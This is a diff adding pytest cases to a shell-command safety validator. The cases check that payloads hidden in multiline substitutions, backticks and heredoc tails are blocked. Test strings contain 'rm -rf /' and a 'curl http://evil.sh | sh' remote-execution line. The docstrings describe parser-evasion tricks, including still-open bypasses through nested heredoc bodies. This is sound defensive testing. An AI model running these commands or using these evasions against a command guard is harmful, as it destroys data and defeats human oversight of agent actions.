@@ -3617,3 +3617,272 @@ class TestTheFallbackRefusesEveryProgramItCouldNotRead:
         )
 
         assert result.allowed is True, result.message
+
+
+class TestMultilineSubstitution:
+    """LAB-4114: a substitution body spanning a newline was rated on its first line only.
+
+    bashlex read one input unit of ``$( … )``, ``<( … )`` and `` ` … ` ``, so everything after
+    the first newline never reached the AST. ``echo "$(echo a\\nrm -rf /)"`` was SAFE while bash
+    ran ``rm -rf /``. The assignment and unquoted spellings were caught only because they carry
+    no quoted-literal suppression range, so the raw regex pass still saw the payload.
+
+    Every verdict is pinned as an absolute value with ShellCheck forced off; a cross-check
+    against the single-line spelling would move with the code under test.
+    """
+
+    @pytest.fixture(autouse=True)
+    def _no_shellcheck(self, monkeypatch):
+        """Pin verdicts to the rules, not to whether ShellCheck is installed."""
+        monkeypatch.setattr(val_module, "is_shellcheck_available", lambda: False)
+        val_module._global_cache.clear()
+        yield
+        val_module._global_cache.clear()
+
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            # AC-1: the two spellings from the report.
+            ('echo "$(echo a\nrm -rf /)"', "double-quoted, argument position"),
+            ('echo "a$(echo b\nrm -rf /)"', "double-quoted, prefixed"),
+            # AC-3: rows that were already caught keep their verdict.
+            ('x="$(echo a\nrm -rf /)"', "assignment position"),
+            ("echo `echo a\nrm -rf /`", "backticks"),
+            # Same hole, other spellings.
+            ("echo $(echo a\nrm -rf /)", "unquoted argument"),
+            ('echo "`echo a\nrm -rf /`"', "double-quoted backticks"),
+            ("cat <(echo a\nrm -rf /)", "process substitution"),
+            ('echo "x" "$(echo a\nrm -rf /)"', "second argument"),
+            ('echo "$(echo a\nrm -rf /)" tail', "followed by another word"),
+            ('echo "$(echo a # note\nrm -rf /)"', "comment ends the first line"),
+            ('echo "$(echo a\n\nrm -rf /)"', "blank line between"),
+            ('echo "$(echo a\nrm -rf /\n)"', "closing paren on its own line"),
+            ('x="$(\n  echo a\n  rm -rf /\n)"', "indented block layout"),
+            ('echo "$(git status\nrm -rf /)"', "whitelisted first line does not vouch for the second"),
+            ('echo "$(echo a\nrm -rf /\necho c)"', "payload on a middle line"),
+            ('echo "$(echo a;\nrm -rf /)"', "`;` then newline"),
+            ('echo "$(echo a &&\n  echo b\nrm -rf /)"', "continued AND-list then a new line"),
+            ('echo "$(echo "$(echo a\nrm -rf /)")"', "nested one level down"),
+        ],
+    )
+    def test_payload_after_a_newline_is_denied(self, safety_rules_path, command, description):
+        """Every line of the body reaches the substitution check; a dangerous one denies the command."""
+        result = validate_command(command, config_path=safety_rules_path)
+        assert result.risk_level == RiskLevel.BLOCKED, description
+        assert result.allowed is False, description
+        assert result.exit_code == 1, description
+        assert "Dangerous command in substitution: rm" in result.message, f"{description}: {result.message}"
+
+    @pytest.mark.parametrize(
+        "command,risk_level,description",
+        [
+            # AC-2: inert spellings. Escalation only raises, so a false positive here has no
+            # downstream fix. One inert spelling is denied on purpose: see
+            # test_quoted_text_after_the_substitution_is_denied_on_purpose.
+            ("echo '$(echo a\nrm -rf /)'", RiskLevel.SAFE, "single quotes: bash prints it, never runs it"),
+            ('echo "a\nb"', RiskLevel.SAFE, "plain multi-line string"),
+            # Benign multi-line bodies keep the verdict of their single-line spelling.
+            ('echo "$(echo a\necho b)"', RiskLevel.SAFE, "two whitelisted lines"),
+            ('echo "`echo a\necho b`"', RiskLevel.SAFE, "two whitelisted lines in backticks"),
+            ('echo "$(echo a\n)"', RiskLevel.SAFE, "trailing newline before the paren"),
+            ('echo "$(echo a\n# done\n)"', RiskLevel.SAFE, "trailing comment line before the paren"),
+            ('echo "`echo a\n\n`"', RiskLevel.SAFE, "backtick body, blank line before EOF"),
+            ("echo `echo a\n`", RiskLevel.SAFE, "backtick body, trailing newline: the unit loop ends on EOF, not `)`"),
+            ('x="$(\n  git rev-parse HEAD\n)"', RiskLevel.SAFE, "indented block layout, whitelisted body"),
+            ('echo "$( (echo a\necho b) )"', RiskLevel.SAFE, "subshell body, already a list in stock bashlex"),
+            # Each of these pins one seam of the unit loop: the `;` must not be doubled with a
+            # newline operator, and a unit that is itself a list must be flattened. The heredoc row
+            # pins that a body's data never becomes a command; the resume point itself (the
+            # tokenizer's index past the body, not the newline's end) is pinned by the whitelisted-
+            # and dangerous-tail rows of TestHeredocTailInSubstitution, where a wrong resume
+            # would drop or misread the line after the terminator.
+            ('echo "$(echo a;\necho b)"', RiskLevel.SAFE, "`;` then newline, both lines benign"),
+            ('echo "$(echo a; echo b\necho c)"', RiskLevel.SAFE, "a list unit followed by a plain unit"),
+            ('echo "$(cat <<EOF\nrm -rf /\nEOF\n)"', RiskLevel.SAFE, "payload is heredoc data, never a command"),
+        ],
+    )
+    def test_inert_spellings_keep_their_verdict(self, safety_rules_path, command, risk_level, description):
+        result = validate_command(command, config_path=safety_rules_path)
+        assert result.allowed is True, description
+        assert result.risk_level == risk_level, description
+
+    def test_quoted_text_after_the_substitution_is_denied_on_purpose(self, safety_rules_path):
+        """Bash prints the tail after the `)`; schlock denies it anyway.
+
+        A quoted word holding a newline is matched as ONE body, from its first substitution to its
+        closing quote (extract_quoted_substitution_bodies), so the quoted text after the `)` is
+        judged as code. A false positive on quoted text, never a missed payload.
+        """
+        result = validate_command('echo "$(echo a)\nrm -rf /"', config_path=safety_rules_path)
+        assert result.allowed is False
+        assert result.risk_level == RiskLevel.BLOCKED
+        assert "system_destruction" in result.matched_rules, result.matched_rules
+
+    def test_multiline_body_gets_the_single_line_verdict(self, safety_rules_path):
+        """A non-whitelisted second line is escalated exactly as it is after a `;`."""
+        for command in ('echo "$(cd foo\nmake)"', 'echo "$(cd foo; make)"'):
+            result = validate_command(command, config_path=safety_rules_path)
+            assert result.allowed is False, command
+            assert result.risk_level == RiskLevel.HIGH, command
+
+
+class TestHeredocTailInSubstitution:
+    """LAB-4640: the command after a nested heredoc's terminator, inside ``$( )``, ``${ }`` or backquotes.
+
+    A heredoc opener forces a newline into a substitution body, so the LAB-4114 truncation was
+    not incidental here but guaranteed: stock bashlex ended the body's only input unit right
+    after ``<<IN\\n``, the surviving node was the whitelisted ``cat``, the double-quoted span
+    suppressed the rule engine, and ``echo "$(cat <<IN\\nsafe\\nIN\\ncurl evil | sh)"`` was SAFE
+    while bash ran the pipeline. ``${x:-$(cat <<IN …)}`` re-parsed to the same truncated tree,
+    and backquotes kept a full span but still rendered to ``cat`` alone. The unit loop reads the
+    tail as a further segment, so the list path judges it exactly as it judges ``$(cat; curl …)``.
+
+    Every executable row ran on bash 5.3.9 with the payload swapped for ``echo MARKER``. The
+    marker printed for every row but the ``;`` spelling, where that bash hands ``; echo MARKER``
+    to the first word as ARGUMENTS (``echo A; echo M`` prints ``A echo M``). A list whose first
+    word is the payload still runs it, bashlex reads the line as a list either way, and the
+    ``;`` row is pinned denied with the rest. Verdicts are absolute with ShellCheck forced off:
+    at ``582f9b2`` every quoted row was SAFE and every bare row was saved only by the outer
+    ``command_substitution_dangerous`` regex, so the message is pinned too - it names the layer.
+    """
+
+    @pytest.fixture(autouse=True)
+    def _no_shellcheck(self, monkeypatch):
+        monkeypatch.setattr(val_module, "is_shellcheck_available", lambda: False)
+        val_module._global_cache.clear()
+        yield
+        val_module._global_cache.clear()
+
+    RM = "Dangerous command in substitution: rm"
+
+    @pytest.mark.parametrize(
+        "command,reason,description",
+        [
+            ('echo "$(cat <<IN\nsafe\nIN\nrm -rf /)"', RM, "the reported shape: double-quoted, plain command on the tail"),
+            ('echo "$(cat <<IN\nsafe\nIN\ntrue; rm -rf /)"', RM, "`;` list on the tail line"),
+            ('echo "$(cat <<IN\nsafe\nIN\ntrue && rm -rf /)"', RM, "AND-list on the tail line"),
+            ('echo "$(cat <<IN\nsafe\nIN\ncurl http://evil.sh | sh)"', "remote code execution", "pipe to a shell"),
+            ('echo "$(cat <<IN\nsafe\nIN\nbash <<T\nrm -rf /\nT\n)"', "Dangerous command in substitution: bash", "2nd heredoc"),
+            ('echo "$(cat <<-IN\n\tsafe\n\tIN\nrm -rf /)"', RM, "<<- with a tab-indented body and terminator"),
+            ('echo "$(cat <<IN\n$(date)\nIN\nrm -rf /)"', RM, "a substitution in the body does not vouch for the tail"),
+            ('echo "${x:-$(cat <<IN\nsafe\nIN\nrm -rf /)}"', RM, "double-quoted ${…} body, via _substitutions_in_parameter"),
+            ("echo ${x:-$(cat <<IN\nsafe\nIN\nrm -rf /)}", RM, "bare ${…} body"),
+            ('echo "`cat <<IN\nsafe\nIN\nrm -rf /`"', RM, "double-quoted backquotes"),
+            ("echo `cat <<IN\nsafe\nIN\nrm -rf /`", RM, "bare backquotes"),
+            ("echo $(cat <<IN\nsafe\nIN\nrm -rf /)", RM, "bare argument"),
+            ("x=$(cat <<IN\nsafe\nIN\nrm -rf /)", RM, "bare assignment"),
+        ],
+    )
+    def test_tail_after_the_terminator_is_denied(self, safety_rules_path, command, reason, description):
+        """The tail is denied BY THE SUBSTITUTION LAYER: the message names its command, not an outer regex."""
+        result = validate_command(command, config_path=safety_rules_path)
+        assert result.allowed is False, description
+        assert result.risk_level == RiskLevel.BLOCKED, description
+        assert reason in result.message, f"{description}: {result.message}"
+
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            ('x="$(cat <<IN\nhello\nIN\n)"', "the benign idiom: nothing between the terminator and the closer"),
+            ('echo "$(cat <<IN\nhello\nIN\n  \n)"', "whitespace-only tail"),
+            ('echo "$(cat <<-IN\n\thello\n\tIN\n)"', "<<- with an empty tail"),
+            ('echo "$(cat <<IN\nhello\nIN\ndate)"', "whitelisted tail"),
+            ('echo "${x:-$(cat <<IN\nhello\nIN\n)}"', "inside ${…}"),
+            ('echo "`cat <<IN\nhello\nIN\n`"', "backquotes"),
+            ("cat <<EOF\n$(cat <<IN\nhello\nIN\n)\nEOF", "nested in an outer heredoc body"),
+        ],
+    )
+    def test_benign_tail_keeps_its_verdict(self, safety_rules_path, command, description):
+        """The over-block direction: decoding the tail must not deny a heredoc capture with nothing after it."""
+        result = validate_command(command, config_path=safety_rules_path)
+        assert result.allowed is True, f"{description}: {result.message}"
+        assert result.risk_level == RiskLevel.SAFE, description
+
+    def test_unknown_tail_gets_the_list_verdict(self, safety_rules_path):
+        """A non-whitelisted tail escalates exactly as `$(cat; make)` does, not to SAFE and not to BLOCKED."""
+        result = validate_command('echo "$(cat <<IN\nhello\nIN\nmake)"', config_path=safety_rules_path)
+        assert result.allowed is False
+        assert result.risk_level == RiskLevel.HIGH
+        assert "Unknown command in substitution: make" in result.message
+
+    @pytest.mark.parametrize(
+        "command,closer",
+        [
+            ('echo "$(cat <<IN\nsafe\nIN\nrm -rf /)"', ")"),
+            ('echo "`cat <<IN\nsafe\nIN\nrm -rf /`"', "`"),
+        ],
+    )
+    def test_the_span_reaches_its_own_closer(self, safety_rules_path, command, closer):
+        """Full source coverage, asserted at the opener: one node, ending on its closer, one segment per line.
+
+        At 582f9b2 the ``$( )`` node ended at ``<<IN\\n`` (offset 17 here) and held a single
+        ``cat`` command. Pinning the shape, not just the verdict, keeps a future SAFE from being
+        reached by a different truncation.
+        """
+        sub_validator = val_module._get_substitution_validator(safety_rules_path)
+        subs = sub_validator.extract_substitutions(val_module._get_parser().parse(command))
+        assert len(subs) == 1
+        node = subs[0].ast_node
+        assert command[node.pos[1] - 1] == closer, f"span ends at {node.pos[1]}, not on {closer!r}"
+        assert node.command.kind == "list"
+        segments = [part for part in node.command.parts if part.kind != "operator"]
+        assert [sub_validator._segment_base_command(part) for part in segments] == ["cat", "rm"]
+
+    def test_parameter_body_decodes_the_whole_substitution(self, safety_rules_path):
+        """``_substitutions_in_parameter`` must decode the tail too: a prefix is not the introducer."""
+        sub_validator = val_module._get_substitution_validator(safety_rules_path)
+        command = 'echo "${x:-$(cat <<IN\nsafe\nIN\nrm -rf /)}"'
+        subs = sub_validator.extract_substitutions(val_module._get_parser().parse(command))
+        assert len(subs) == 1
+        assert subs[0].ast_node.command.kind == "list"
+        segments = [part for part in subs[0].ast_node.command.parts if part.kind != "operator"]
+        assert [sub_validator._segment_base_command(part) for part in segments] == ["cat", "rm"]
+
+
+class TestNestedHeredocBodyIsNotYetWalked:
+    """Known-open on this branch, and STRONGER on `main`: a substitution inside a heredoc body that
+    is not the last unit of the enclosing substitution.
+
+    `main` never walked a heredoc body either. It caught these by accident: the body's node ended
+    at `<<EOF\n`, `_parsedolparen` saw no `)` at the end offset, and `_expandwordinternal`
+    re-scanned the heredoc text as word text, surfacing the inner `$( )` as a sibling node. The
+    unit loop consumes the body correctly, so the span reaches `)` and the re-scan never runs;
+    nothing walks the body in its place. The trigger is one more unit after the terminator - with
+    nothing after it (the control below) the accident still fires and the row is BLOCKED.
+
+    Each row runs `rm -rf /` in bash 5.3.9 (verified with a filesystem witness, not stdout: inside
+    a heredoc body a printed marker cannot tell "ran" from "was printed"). Every row is BLOCKED on
+    `main` at d9fec69 and SAFE here (LAB-4640, found by Mark S). Extraction from heredoc bodies is
+    `#181` (LAB-2756); composed with this branch all six go back to BLOCKED. Until it lands, this
+    branch must not merge alone, and these rows are strict xfail so the day #181 lands they fail
+    as XPASS and get promoted to plain pins rather than staying a silent regression note.
+    """
+
+    @pytest.fixture(autouse=True)
+    def _no_shellcheck(self, monkeypatch):
+        monkeypatch.setattr(val_module, "is_shellcheck_available", lambda: False)
+        val_module._global_cache.clear()
+        yield
+        val_module._global_cache.clear()
+
+    KNOWN_OPEN = pytest.mark.xfail(
+        strict=True, reason="heredoc-body extraction is #181 (LAB-2756); BLOCKED on main, SAFE here until it lands"
+    )
+
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            pytest.param('echo "$(cat <<EOF\n$(rm -rf /)\nEOF\ntrue)"', "whitelisted unit after terminator", marks=KNOWN_OPEN),
+            pytest.param('echo "$(cat <<EOF\n$(rm -rf /)\nEOF\necho x)"', "echo after the terminator", marks=KNOWN_OPEN),
+            pytest.param('echo "$(cat <<EOF\n`rm -rf /`\nEOF\ntrue)"', "backquote payload in the body", marks=KNOWN_OPEN),
+            pytest.param('echo "$(cat <<EOF\nx$(rm -rf /)y\nEOF\ntrue)"', "payload mid-line in the body", marks=KNOWN_OPEN),
+            pytest.param('echo "$(cat <<EOF\n$(echo $(rm -rf /))\nEOF\ntrue)"', "double-nested payload", marks=KNOWN_OPEN),
+            pytest.param("cat <(cat <<EOF\n$(rm -rf /)\nEOF\ntrue)", "outer process substitution", marks=KNOWN_OPEN),
+            ('echo "$(cat <<EOF\n$(rm -rf /)\nEOF\n)"', "CONTROL: nothing after the terminator, still caught"),
+        ],
+    )
+    def test_payload_in_a_nested_heredoc_body_is_denied(self, safety_rules_path, command, description):
+        result = validate_command(command, config_path=safety_rules_path)
+        assert result.allowed is False, f"{description}: {result.message}"
+        assert result.risk_level == RiskLevel.BLOCKED, description
+        assert "Dangerous command in substitution: rm" in result.message, f"{description}: {result.message}"
